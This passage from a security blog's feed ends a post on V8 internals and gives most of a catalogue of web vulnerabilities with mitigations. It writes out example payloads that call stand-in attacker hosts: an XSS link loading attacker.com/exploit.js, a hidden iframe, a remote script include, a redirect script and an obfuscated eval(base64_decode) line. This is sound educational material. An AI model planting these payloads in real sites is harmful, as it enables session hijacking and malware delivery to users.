&lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kr"&gt;inline&lt;/span&gt; &lt;span class="n"&gt;cache&lt;/span&gt; &lt;span class="n"&gt;miss&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="n"&gt;mv&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;cached&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instead of a complicated lookup at the propriety, the propriety reading translates into three machine operations!&lt;/p&gt;
&lt;p&gt;It might seem inefficient to create a new hidden class whenever a property is added. However, because of the class transitions the hidden classes can be reused several times. It turns out that most of the access to objects are within the same hidden class.&lt;/p&gt;
&lt;h3&gt;V8's Inline caching&lt;/h3&gt;
&lt;p&gt;When the engine runs the code, it does not know about the hidden class. V8 optimizes property access by predicting that the class will also be used for all future objects accessed in the same section of code, and adds the information to the &lt;strong&gt;inline cache code&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Inline caching is a class-based object-oriented optimization technique employed by some language runtimes.  The concept of inline caching is based on the  observation that the objects that occur at a particular call site are often of the same type. Therefore, performance can be increased by storing the result of a method lookup &lt;em&gt;inline&lt;/em&gt; (at the call site).&lt;/p&gt;
&lt;p&gt;If V8 has predicted correctly the property's value, this is assigned in a single operation. If the prediction is incorrect, V8 patches the code to remove the optimization. To facilitate this process, call sites are assigned in four different states:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Unitilized&lt;/strong&gt;: Initial state, for any object that was never seen before.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Pre-monomorphic&lt;/strong&gt;: Behaves like an uninitialized but do a one-time lookup and  rewrite it to the monophorfic state. It's good for code executed only once (such as initialization and setup).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Monomphorpic&lt;/strong&gt;: Very fast. Recodes the hidden class of the object already seen.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Megamorphic&lt;/strong&gt;: Like the initialized stub (since it always does runtime lookup) except that it never replaces itself.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In conclusion, the combination of using hidden classes to access properties with inline caching (plus  machine code generation) does optimize in cases where  type of objects are frequently created and accessed in a similar way. This greatly improves the speed at which most JavaScript code can be executed.&lt;/p&gt;
&lt;h3&gt;V8's Efficient Garbage Collecting&lt;/h3&gt;
&lt;p&gt;In V8, a &lt;strong&gt;precise garbage collection&lt;/strong&gt; is used. &lt;em&gt;Every pointer's location are known on the execution stack&lt;/em&gt;, so V8 is able to implement incremental garbage collection. V8 can migrate an object to another place and just rewire the pointer.&lt;/p&gt;
&lt;p&gt;In summary, &lt;a href="https://developers.google.com/v8/design#garb_coll"&gt;V8's garbage collection&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;stops&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt; &lt;span class="n"&gt;execution&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt; &lt;span class="n"&gt;performing&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;garbage&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;

&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;processes&lt;/span&gt; &lt;span class="n"&gt;only&lt;/span&gt; &lt;span class="n"&gt;part&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;heap&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;most&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt; &lt;span class="n"&gt;cycles&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;minimizing&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;impact&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;stopping&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;

&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;always&lt;/span&gt; &lt;span class="n"&gt;knows&lt;/span&gt; &lt;span class="n"&gt;exactly&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;pointers&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;avoiding&lt;/span&gt; &lt;span class="n"&gt;falsely&lt;/span&gt; &lt;span class="n"&gt;identifying&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;pointers&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Further Readings:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://noncombatant.org/2014/03/11/privacy-and-security-settings-in-chrome/"&gt;Privacy And Security Settings in Chrome&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;[1] When the Python interpreter is invoked with the &lt;code&gt;-O&lt;/code&gt; flag, optimized code is generated and stored in &lt;strong&gt;&lt;em&gt;.pyo&lt;/em&gt;&lt;/strong&gt; files. The optimizer removes assert statements.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Marina von Steinkirch</dc:creator><pubDate>Sat, 01 Nov 2014 04:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-11-01:a-closer-look-at-chromes-security-understanding-v8.html</guid><category>V8</category><category>JIT</category><category>JavaScript</category><category>garbage_collection</category><category>cache</category><category>bytecode</category><category>Chrome</category><category>Python</category></item><item><title>A List of Common Web Vulnerabilities</title><link>http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html</link><description>&lt;p&gt;Although nomenclatures don't help  much when you are facing a security problem, I am keeping this list for a systematic organization. It is constantly been updated.&lt;/p&gt;
&lt;p&gt;In addition to this list, you can check some specific web exploration older posts: &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Exploiting the web in 20 lessons&lt;/a&gt; and &lt;a href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html"&gt;D-Camp CTF 2014&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Vulnerabilities to Web Applications&lt;/h1&gt;
&lt;h2&gt;Cross-site Scripting (XSS)&lt;/h2&gt;
&lt;p&gt;XSS is caused by &lt;strong&gt;insufficient input validation or output escaping&lt;/strong&gt;. This can allow an attacker to insert HTML markup or scripts in a vulnerable website. The injected  code will have plenty of access in this site, and in many cases, to the HTTP cookies stored by the client.&lt;/p&gt;
&lt;p&gt;HTML has five characters that are reserved:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;both angle brackets&lt;/strong&gt;,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;single and double quotes&lt;/strong&gt;,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;and &lt;strong&gt;ampersand&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The ampersand should never appear in most HTML sections. Both angle brackets should not be used inside a tag, unless  properly quoted. Quote characters inside a tag can also be harmless in text.&lt;/p&gt;
&lt;p&gt;To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the &lt;a href="http://www.w3schools.com/html/html_entities.asp"&gt;Entity Encoding&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Non-Persistent Attack:&lt;/h3&gt;
&lt;p&gt;XSS non-persistent attacks consist on getting users to click a link with attacker's script. A typical scenario is the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message &lt;strong&gt;Pwnd&lt;/strong&gt; is displayed:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=&amp;lt;script%20type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;Pwnd!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ol&gt;
&lt;li&gt;The attacker crafts an exploit script that gets the victim's authorization information (for example in an &lt;strong&gt;Authorization Cookie&lt;/strong&gt;). The attacker sends a &lt;strong&gt;phishing email&lt;/strong&gt; to the victim with a link with some script such as:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ol&gt;
&lt;li&gt;If the victim clicks in the link, her/his browser runs the script (legitimate by the &lt;strong&gt;Same Origin Policy&lt;/strong&gt;, &lt;em&gt;i.e&lt;/em&gt; resources are shared between origins with same protocol, domain and port).  The attacker now has control of the victim's identity in that website. If the victim is the administrator, it is game over.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Persistent Attack:&lt;/h3&gt;
&lt;p&gt;XSS persistent attacks store a malicious script in the databases, which will retrieved by the users. A typical scenario is the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The attacker verifies that the target website has a XSS stored vulnerability (for example, allowing her/him to post text with HTML tags).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The attacker creates an account in the target website and posts something with a hidden script (similar to the one above).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;When anyone loads the page with that post, the script runs, and the attacker is able to hijack the victim's section.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Additionally, in &lt;em&gt;password managers&lt;/em&gt;, there is a risk of  amplification of XSS bugs. In the web applications that use &lt;em&gt;&lt;a href="https://www.owasp.org/index.php/HttpOnly"&gt;httponly&lt;/a&gt;&lt;/em&gt; cookies, a successful exploitation of an XSS flaw may give the attacker a transient access to the user's account (and password).&lt;/p&gt;
&lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Servers should should use &lt;strong&gt;Content Security Policy&lt;/strong&gt; (CSP) HTTP header, which allow the whitelist of resources contents. For instance, the &lt;em&gt;Content-Security-Policy&lt;/em&gt; header disables inline JavaScript by default.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Servers can use the &lt;strong&gt;HttpOnly&lt;/strong&gt; HTTP header which allows to set a cookie that is unavailable to client-side scripts.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Search inputs should &lt;em&gt;always&lt;/em&gt; be sanitized in both server-side and client-side.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Servers should redirect invalid requests.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Servers should invalidate sessions from different IP addresses. However this can be mitigate if the attacker is behind a web proxy or behind the same NAT IP.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Clients should disabling scripts by default (for example with &lt;a href="https://addons.mozilla.org/en-us/firefox/addon/noscript/"&gt;NoScript&lt;/a&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Cross Script Inclusion (XSSI)&lt;/h2&gt;
&lt;p&gt;XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via &lt;code&gt;&amp;lt;script src=..&amp;gt;&lt;/code&gt;, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.&lt;/p&gt;
&lt;p&gt;For instance, JSON is a JavaScript syntax structure  to keep in-place object serialization.  The curly bracket &lt;strong&gt;{&lt;/strong&gt; is assumed to be the beginning of the object. Overloading curly  brackets means that JSON blocks will not be recognized properly in standalone statements.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Cross-site Request Forgery (CSRF, XSRF)&lt;/h2&gt;
&lt;p&gt;CSRF allows attackers to execute actions using the credentials of another user without that user's knowledge or consent. It is  the failure to verify that a particular state-changing HTTP request received by the &lt;strong&gt;server-side&lt;/strong&gt; portion of the application was initiated from the expected &lt;strong&gt;client-side&lt;/strong&gt; origin. Any third-party website loaded in the browser can perform actions in behalf of the victim.&lt;/p&gt;
&lt;p&gt;On cross-domain navigation, the browser includes any ambient credentials. To the server, a request originating from its own client-side code will appear as the same as the request from a rogue third-party site and  it might be granted the same privilege.&lt;/p&gt;
&lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Any two windows with frames opened in a browser will remain &lt;strong&gt;Same Origin&lt;/strong&gt; with each other even if the user logs out from one account and permitting third-party to submit password and username and log int an attacked account. For example, the attacker can open and keep a frame pointing to a sensitive page and then log the victim into the attacker-controlled account to execute some code injection. Despite the change of  HTTP credentials the code injected will access the previous loaded frame.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In several home network routers, CSRF can permit attackers to access the device and intercept or modify the network traffic.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A protection can be done by checking a nonce in each POST request (no replay attacks in a form POST).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Including a secret user- and session- specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the &lt;strong&gt;same-origin&lt;/strong&gt; policy.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Header Injection (Response Splitting)&lt;/h2&gt;
&lt;p&gt;Insufficient escaping of newlines in HTTP responses, generated by the server-side. This can lead to XSS or proxy cache poisoning.&lt;/p&gt;
&lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LF and CR characters must be stripped from any attacker-controlled values in the HTTP headers.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Mixed Content&lt;/h2&gt;
&lt;p&gt;Loading non-HTTPS sub-resources on HTTPS pages undoes most of the benefits of encryption. For scripts and applets, this makes the application vulnerable to active attackers, specially in open wireless networks.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Open Redirection&lt;/h2&gt;
&lt;p&gt;Applications that perform HTTP- or script-based requests to user-supplied URLs without constraining the possible destinations in any meaningful way, leading, for example, to XSS.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Referer Leakage&lt;/h2&gt;
&lt;p&gt;HTTP requests may include a &lt;em&gt;Referer&lt;/em&gt; header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.&lt;/p&gt;
&lt;p&gt;This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the &lt;em&gt;Referer&lt;/em&gt; header.&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Vulnerabilities to Web Application Design&lt;/h1&gt;
&lt;h2&gt;Cache Poising&lt;/h2&gt;
&lt;p&gt;Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Clickjacking&lt;/h2&gt;
&lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in a frame.&lt;/p&gt;
&lt;p&gt;If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;blog_posts&lt;/span&gt; &lt;span class="n"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;post_text&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iframe&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Content and Character Set Sniffing&lt;/h2&gt;
&lt;p&gt;Possibility that the browser will ignore any authoritative content type of character set information provided by the server and interpret the returned document incorrectly.&lt;/p&gt;
&lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Scenarios where &lt;a href="http://www.w3.org/Protocols/rfc1341/4_Content-Type.html"&gt;Content-Type&lt;/a&gt; is ignored.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Cookie Forcing/Injection&lt;/h2&gt;
&lt;p&gt;Possibility of blindly injecting HTTP cookies into the context of an otherwise impenetrable web application due to issues in how the mechanism is designed and implemented in  browsers. There are special concern to HTTPS applications.&lt;/p&gt;
&lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Cookie stuffing: deleting cookies belonging to another applications by overflowing the cookie jar.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Denial-of-Service (DoS)&lt;/h2&gt;
&lt;p&gt;Any opportunity of the attacker to bring down a browser or server, or make the use of a targeted application  more difficult.&lt;/p&gt;
&lt;h3&gt;DoS and amplification attacks&lt;/h3&gt;
&lt;p&gt;DNS resolvers are attractive targets to attackers who exploit the resolvers' large response-to-request size ratio to gain additional free bandwidth. Resolvers that support EDNS0 (Extension Mechanisms for DNS) are especially vulnerable because of the substantially larger packet size that they can return.&lt;/p&gt;
&lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
&lt;p&gt;In an amplification scenario, the attack proceeds as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..&lt;/li&gt;
&lt;li&gt;The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Framebusting&lt;/h2&gt;
&lt;p&gt;The possibility of a framed page navigating the top-level document to a new URL without having to satisfy &lt;strong&gt;same-origin&lt;/strong&gt; checks. It might be exploited for phishing.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;HTTP Downgrade&lt;/h2&gt;
&lt;p&gt;Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.&lt;/p&gt;
&lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"&gt;Strict transport security&lt;/a&gt;:  The approach allows any site to instruct the browser that all future requests made to a particular hostname or domain should always use HTTPS and that any HTTP traffic should be automatically upgraded and submitted over  HTTPS.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Network Fenceposts&lt;/h2&gt;
&lt;p&gt;When websites let the browser to interact with destinations not directly accessible to the attacker, for example, with the systems on a victim's internal networks. This attack can be performed with help of &lt;a href="http://en.wikipedia.org/wiki/DNS_rebinding"&gt;DNS rebinding&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Internet Explorer implements the zone model, a potential approach to the risk.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Vulnerabilities in the Server-Side&lt;/h1&gt;
&lt;h2&gt;Buffer Overflow&lt;/h2&gt;
&lt;p&gt;In low-level languages such as C or C++, buffer overflow happens when a program allows more information to be stored in a particular memory region than there is space to accommodate the incoming data, leading to the unexpected overwrite of other vital data structures.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Command Injection (SQL, PHP, Shellcode)&lt;/h2&gt;
&lt;p&gt;Due to insufficient input filtering or output escaping, an attacker-controlled strings may be processed as statements in an interpreted language used by the application.&lt;/p&gt;
&lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Malicious code injections in an iframe to the attack site:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class="na"&gt;frameborder=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://&amp;lt;attack-site&amp;gt;/path/file&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;JavaScript or another scripting language that calls and runs scripts from an attack site:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://malware-attack-site/js/x55.js&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Scripts that redirects the browser to an attack site:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
  if (document.referrer.match(/google\.com/)) {
    window.location(&amp;quot;http://malware-attack-site/&amp;quot;);
  }
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Malicious code that is obfuscated to avoid detection:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Shared object files designed to randomly write harmful code to otherwise benign scripts:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#httpd.conf modified by the hacker&lt;/span&gt;
&lt;span class="n"&gt;LoadModule&lt;/span&gt; &lt;span class="n"&gt;harmful_module&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
&lt;span class="n"&gt;AddModule&lt;/span&gt; &lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;Error template type of malware infection&lt;/strong&gt; occurs when the template used for error messages, such as 404 File not Found, is configured to distribute malware. In this way, attackers can launch attacks on URLs that do not even exist on the victim's website.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Investigate all possible harmful code on the website. It may be helpful to search for words like [iframe] to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, on Unix-based systems:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ | less
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Directory Traversal&lt;/h2&gt;
&lt;p&gt;Due to insufficient filtering (such as the failure to recognize &lt;code&gt;../&lt;/code&gt; segments) an application can be tricked into reading or writing files at arbitrary locations. Unconstrained file-writing bugs can be exploitable to run attacker-supplied code.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;File Inclusion&lt;/h2&gt;
&lt;p&gt;If used without a qualifier or prefixed with a &lt;em&gt;local&lt;/em&gt; (LFI), the term is synonymous to read-related directory traversal. Remote file inclusion (RFI) is an alternative way to exploit file-inclusion vulnerabilities by specifying a URL rather than a valid file path. In some languages, a common API opens local files and fetches remote URLS, which might supplies the ability of retrieving attacker's files.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Format String Vulnerability&lt;/h2&gt;
&lt;p&gt;Several libraries accept templates (format strings) followed by a set of parameters that the function is expected to insert into the template at predefined locations. For example,  C has functions such as &lt;em&gt;printf&lt;/em&gt;, &lt;em&gt;syslog&lt;/em&gt;, etc. The vulnerability is caused by permitting attackers to supply the template to one of these functions. This can lead to  data leaks and code execution.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Integer Overflow&lt;/h2&gt;
&lt;p&gt;Vulnerability specific to languages with no range checking. The flaw is caused by the developer failing to detect that an integer exceeded the maximum possible value and rolled back to zero, to a large negative integer, or to some hardware-specific  result.&lt;/p&gt;
&lt;p&gt;Integer underflow is the opposite effect: crossing the minimum value and rolling over to a very large positive integer.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Pointer Management Vulnerabilities&lt;/h2&gt;
&lt;p&gt;In languages that use raw memory pointers such as C or C++, it is possible to use pointers that are either unitized or nor longer valid (dangling). These vulnerabilities will corrupt the internal state of the program and allow an attacker to execute attacker-supplied code.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Cache poisoning attacks&lt;/h2&gt;
&lt;p&gt;Several variants of DNS spoofing attacks that can result in cache poisoning.&lt;/p&gt;
&lt;h3&gt;Example of Attack&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The attacker sends a target DNS resolver multiple queries for a domain name for which she/he knows the server is not authoritative, and that is unlikely to be in the server's cache.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The resolver sends out requests to other nameservers (whose IP addresses the attacker can also predict).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
